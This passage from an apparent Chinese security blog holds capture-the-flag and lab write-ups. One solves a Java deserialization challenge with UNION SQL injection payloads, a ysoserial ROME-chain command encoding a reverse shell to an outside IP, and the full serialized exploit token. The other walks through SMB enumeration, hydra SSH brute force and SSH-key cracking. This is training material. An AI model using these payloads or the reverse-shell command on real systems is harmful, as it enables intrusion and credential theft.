class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())</span><br><span class="line">          table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>)); </span><br><span class="line">        table.setTableName(TableName);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line">        String PK;</span><br><span class="line">        <span class="keyword">for</span> (PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>));</span><br><span class="line">        <span class="keyword">while</span> (data.next()) &#123;</span><br><span class="line">          <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">          table.list.add(row);</span><br><span class="line">        &#125; </span><br><span class="line">        Tables.add(table);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">      var16.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> Tables;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Table.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Row;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Table</span> &#123;</span><br><span class="line">  String tableName;</span><br><span class="line">  </span><br><span class="line">  String tableDescribe;</span><br><span class="line">  </span><br><span class="line">  List&lt;Row&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTableDescribe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.tableDescribe;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTableDescribe</span><span class="params">(String tableDescribe)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.tableDescribe = tableDescribe;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTableName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.tableName;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTableName</span><span class="params">(String tableName)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.tableName = tableName;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> List&lt;Row&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;Row&gt; list)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.list = list;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Test.java</strong></p><p>接收dbName参数，然后调用<code>getTableData</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseCode;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseResult;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.security.annotation.Access;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.SqlDict;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/common/test&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="meta">@PostMapping(&#123;&quot;/sqlDict&quot;&#125;)</span></span><br><span class="line">  <span class="meta">@Access</span></span><br><span class="line">  <span class="meta">@ApiOperation(&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> ResponseResult <span class="title function_">sqlDict</span><span class="params">(String dbName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;abc@12345&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Swagger</strong></p><p><img src="../images/image-20230525110404630.png" alt="image-20230525110404630"></p><p>这个东西就是解题关键了</p><p><strong>swagger-ui 提供了一个可视化的UI页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署UI项目。</strong></p><p>查资料会查到<code>swagger-ui.html</code></p><p>访问<code>swagger-ui.html</code>，会看到有三个路由，分别对应不同的功能，注意看第三个功能，对应着jar包中<code>Test.class</code>，我们可以通过传<code>dbName</code>来进行sql注入</p><p><img src="../images/image-20230525110943768.png" alt="image-20230525110943768"></p><p>这个sqlDict就是我们jar包里给的文件了，下麦呢的dbName就是我们可以进行sql注入的地方</p><p>因为这个的sql语句在jar里面已经给出了，那么就可以直接进行sql注入了</p><p>(<strong>并且这里还不对查询语句进行检测</strong>)</p><h3 id="Jdbc-sql注入"><a href="#Jdbc-sql注入" class="headerlink" title="Jdbc sql注入"></a>Jdbc sql注入</h3><p><img src="../images/image-20230525112531672.png" alt="image-20230525112531672"></p><p>这里的<code>myapp</code>是因为</p><p><img src="../images/image-20230525112618567.png" alt="image-20230525112618567"></p><p>所以就是<code>myapp</code></p><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取所有数据库的名字</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#</span><br><span class="line">结果</span><br><span class="line">information_schema,myapp,mysql,performance_schema,sys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525112806875.png" alt="image-20230525112806875"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(table_name)from(information_schema.tables)where(table_schema=&#x27;myapp&#x27;)#</span><br><span class="line">结果</span><br><span class="line">user</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113000057.png" alt="image-20230525113000057"></p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(column_name)from(information_schema.columns)where((table_schema=&#x27;myapp&#x27;)and(table_name=&#x27;user&#x27;))#</span><br><span class="line">结果</span><br><span class="line">id,name,pwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113118589.png" alt="image-20230525113118589"></p><h4 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(id)from(user)#</span><br><span class="line">结果 1</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(name)from(user)#</span><br><span class="line">结果 admin</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(pwd)from(user)#</span><br><span class="line">结果 </span><br></pre></td></tr></table></figure><p>然后将用户名和密码在<code>/common/user/login</code>处提交，获取一串字符串</p><p><img src="../images/image-20230525113238116.png" alt="image-20230525113238116"></p><p>下面是使用curl命令进行POST发包  记录一下这个操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --header &#x27;Content-Type: application/json&#x27; --header &#x27;Accept: application/json&#x27; -d &#x27;&#123; \ </span><br><span class="line">   &quot;password&quot;: &quot;admin&quot;, \ </span><br><span class="line">   &quot;username&quot;: &quot;admin%40Rrrr_ctf_asde&quot; \ </span><br><span class="line"> &#125;&#x27; &#x27;http://1250b81b-263f-47e9-9375-540b6aa7c9c7.node4.buuoj.cn/common/user/login&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113410769.png" alt="image-20230525113410769"></p><p>登录成功后返回有个base64编码的字段</p><p>将这段字符串放到<code>/common/user/current</code>处提交，然后就会发现回显了这个用户的信息</p><p><img src="../images/image-20230525113522530.png" alt="image-20230525113522530"></p><p>回显出身份信息</p><h3 id="对序列化字符串分析"><a href="#对序列化字符串分析" class="headerlink" title="对序列化字符串分析"></a>对序列化字符串分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu</span><br></pre></td></tr></table></figure><p><strong>下方的特征可以作为序列化的标志参考:</strong><br><strong>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。</strong><br><strong>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</strong></p><h4 id="java-Deserialization-Scanner插件使用"><a href="#java-Deserialization-Scanner插件使用" class="headerlink" title="java Deserialization Scanner插件使用"></a>java Deserialization Scanner插件使用</h4><p><img src="../images/image-20230525113734998.png" alt="image-20230525113734998"></p><p>安装一下这个插件来对这个base64编码的字符串进行分析，看是属于哪一条链子的</p><p><img src="../images/image-20230525114050230.png" alt="image-20230525114050230"></p><p>把ysoserial的jar的路径也配置一下</p><p>然后抓包(<strong>抓的是current这个包，因为base64编码的字符串是用这个发包的</strong>)，将其发送到插件中</p><p><img src="../images/image-20230525114437172.png" alt="image-20230525114437172"></p><p><img src="../images/image-20230525114547498.png" alt="image-20230525114547498"></p><p>最后发现是<code>ROME</code>链</p><p>然后就去拿ysoserial直接来打就行，然后在使用<code>current</code>这个路由来进行传参就行了</p><p>这里话直接反弹shell就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-2874a69f61-1.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; a.bin</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;a.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><strong>这样写的好处是到时候生成的payload会是一条直线</strong>  不会有很多换行</p><p><img src="../images/image-20230525200007224.png" alt="image-20230525200007224"></p><p>然后拿到<code>current</code>这个路由传参打就行了</p><p>注意的是<code>Bearer</code>这个前缀别忘了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AEEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////8AdAADYWxscHVyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAb1yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAYWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1ERXVOREl1TXprdU1URXdMek16T0RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXI5NzgwMzcwMTcyMDA5NQEAH0x5c29zZXJpYWwvUHduZXI5NzgwMzcwMTcyMDA5NTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABkAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFXNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHkwABF9vYmpxAH4ACXhwcQB+ACFxAH4AFXNxAH4AHXZxAH4AAnEAfgANc3EAfgAicQB+ACVxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525201356657.png" alt="image-20230525201356657"></p><p><img src="../images/image-20230525201406655.png" alt="image-20230525201406655"></p><p>然后就可以了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话是记录一下关于java反序列化的刷题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(因为刚把一些链子给跟完)&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;东华杯ezgadget&quot;&gt;&lt;a href=&quot;#东华杯ezgadget&quot; class=&quot;headerlink&quot; title=&quot;东华</summary>
      
    
    
    
    
    <category term="java-反序列化题目" scheme="https://ke1nys.github.io/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>thm-Basic Pentesting</title>
    <link href="https://ke1nys.github.io/posts/4f9775c1.html"/>
    <id>https://ke1nys.github.io/posts/4f9775c1.html</id>
    <published>2023-05-21T08:35:12.000Z</published>
    <updated>2023-05-21T14:28:20.543Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章主要是为了记录一下学习，这个靶机里有好几个知识点是之前没学过的，然后就学习记录一下</p><p>老样子还是先扫一下端口</p><p><img src="../images/image-20230521164057332.png" alt="image-20230521164057332"></p><p>扫出了这些端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">22</span><br><span class="line">80</span><br><span class="line">139</span><br><span class="line">445</span><br><span class="line">8009</span><br><span class="line">8080</span><br></pre></td></tr></table></figure><p>接下来访问80端口</p><p><img src="../images/image-20230521164222216.png" alt="image-20230521164222216"></p><p>没收集到啥有用的信息，扫个目录看看</p><p><img src="../images/image-20230521164453614.png" alt="image-20230521164453614"></p><p>发现一个development目录  于是进行访问</p><p><img src="../images/image-20230521164535782.png" alt="image-20230521164535782"></p><p>发现两个文件</p><p>dev.txt</p><p><img src="../images/image-20230521164625273.png" alt="image-20230521164625273"></p><p>j.txt</p><p><img src="../images/image-20230521164734023.png" alt="image-20230521164734023"></p><p>所以我们在 dev 中打开这两个文本文件，我们可以看到消息是关于一些 apache struts 和 2.5.12 版本的，而 j.txt 文件是关于机器内部哈希密码的目录。所以现在让我们考虑一下 Apache struts 2.5.12 版本，我们用 google 搜索了 Apache struts 2.15.12 以找到一些漏洞，我们得到了一个可以利用的 Metasploit 模块，但在尝试之后并没有给我一个连接。</p><p>我们无法从 Metasploit 模块获得反向 shell</p><p>现在让我们回到 Nmap 脚本，结果显示我们打开了 SMB 端口，我们也有 SMB 版本如果 SMB 版本存在漏洞，让我们谷歌一下</p><p>经过一些研究，我们得到了 <strong>Enum4linux—— <em>Enum4linux</em></strong>是一个用于从 Windows 和 <strong>Samba</strong> 系统枚举信息的工具。</p><p>所以现在我们可以运行命令“Enum4linux -a ipaddress”</p><p><img src="../images/image-20230521165356870.png" alt="image-20230521165356870"></p><p>成功找到这两个用户名，这里还有一种方法就是尝试一一下<strong>smb匿名用户登录</strong></p><p><code>smbclient //10.10.245.61/anonymous</code></p><p><img src="../images/image-20230521165706991.png" alt="image-20230521165706991"></p><p>直接匿名登录成功了</p><p><img src="../images/image-20230521165802097.png" alt="image-20230521165802097"></p><p>这也可以成功拿到名字，接下来就是尝试爆破ssh密码了</p><p>使用的是<code>hydra</code>工具  也叫九头蛇</p><p><img src="../images/image-20230521170726504.png" alt="image-20230521170726504"></p><p>使用这个工具，然后爆破出 <code>jan</code>的密码为<code>armando</code></p><p>于是进行登录</p><p><img src="../images/image-20230521170849656.png" alt="image-20230521170849656"></p><p>成功进行登录</p><p><img src="../images/image-20230521171014069.png" alt="image-20230521171014069"></p><p>发现jan用户没有权限查看kay用户目录下的文件，于是我们就尝试收集一些信息来尝试登录kay用户</p><p><img src="../images/image-20230521171101435.png" alt="image-20230521171101435"></p><p>发现存在<code>.ssh</code>文件</p><p>ssh进行免密登录的要求是<strong>私钥</strong>(<code>id_rsa</code>)要在客户段，<strong>公钥</strong>(<code>id_rsa.pub</code>)在服务端</p><p>在谷歌上搜索后我们知道这个 SSH 密钥可以用 John the ripper 破解。因此，让我们尝试破解 SSH 密钥。</p><p>所以首先我们必须找到 ssh2john.py 